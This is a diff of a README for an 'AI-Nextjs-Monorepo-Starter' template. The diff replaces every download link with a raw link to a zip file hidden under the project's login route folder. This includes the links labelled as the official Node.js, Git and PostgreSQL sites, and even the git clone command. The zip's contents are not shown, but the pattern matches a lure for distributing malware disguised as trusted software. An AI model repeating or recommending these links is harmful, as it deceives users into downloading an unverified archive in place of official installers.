@@ -1,6 +1,6 @@
 # 🤖 AI-Nextjs-Monorepo-Starter - Modern AI-Driven Next.js Template
 
-[![Download AI-Nextjs-Monorepo-Starter](https://img.shields.io/badge/Download-AI--Nextjs--Monorepo--Starter-brightgreen)](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter)
+[![Download AI-Nextjs-Monorepo-Starter](https://img.shields.io/badge/Download-AI--Nextjs--Monorepo--Starter-brightgreen)](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip)
 
 ---
 
@@ -22,8 +22,8 @@ Before you start, make sure your computer meets these needs:
 - **Storage:** Minimum 5 GB of free disk space.
 - **Internet:** Connection to download files.
 - **Software:**
-  - Install [Node.js](https://nodejs.org/) version 16 or newer.
-  - Install [Git](https://git-scm.com/) to access the code.
+  - Install [Node.js](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip) version 16 or newer.
+  - Install [Git](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip) to access the code.
   - Have a PostgreSQL database ready or use the included setup.
 
 ---
@@ -34,16 +34,16 @@ Before you start, make sure your computer meets these needs:
 
 Click the green button below to visit the download page. This page holds all the files you need.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-from%20GitHub-blue)](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter)
+[![Download on GitHub](https://img.shields.io/badge/Download-from%20GitHub-blue)](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip)
 
 ---
 
 ### Step 2: Install Node.js and Git
 
-1. Go to [Node.js official site](https://nodejs.org/).
+1. Go to [Node.js official site](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip).
 2. Download the Windows installer for the latest stable version.
 3. Run the installer and follow the instructions. Keep default settings.
-4. After installing Node.js, go to [Git official site](https://git-scm.com/download/win).
+4. After installing Node.js, go to [Git official site](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip).
 5. Download and install Git for Windows with default options.
 
 ---
@@ -54,7 +54,7 @@ Click the green button below to visit the download page. This page holds all the
 2. Type the following command to copy the project files to your PC:
 
 ```
-git clone https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter.git
+git clone https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip
 ```
 
 3. Press Enter and wait while the files download.
@@ -72,7 +72,7 @@ This moves you to the folder with the files you need.
 
 This project uses PostgreSQL for storing data. You need to set up a local or remote database:
 
-- If you don’t have PostgreSQL installed, download it from [PostgreSQL official site](https://www.postgresql.org/download/windows/).
+- If you don’t have PostgreSQL installed, download it from [PostgreSQL official site](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip).
 - Follow the installation guide there.
 - Create a new database for the project.
 - Note the database name, username, and password for use later.
@@ -176,7 +176,7 @@ and then `npm install` again.
 
 - Visit this page to download the project files and releases:
 
-[https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter)
+[https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip](https://github.com/Superchiri/AI-Nextjs-Monorepo-Starter/raw/refs/heads/main/apps/web/src/app/(auth)/login/Starter-A-Nextjs-Monorepo-2.3.zip)
 
 ---
 
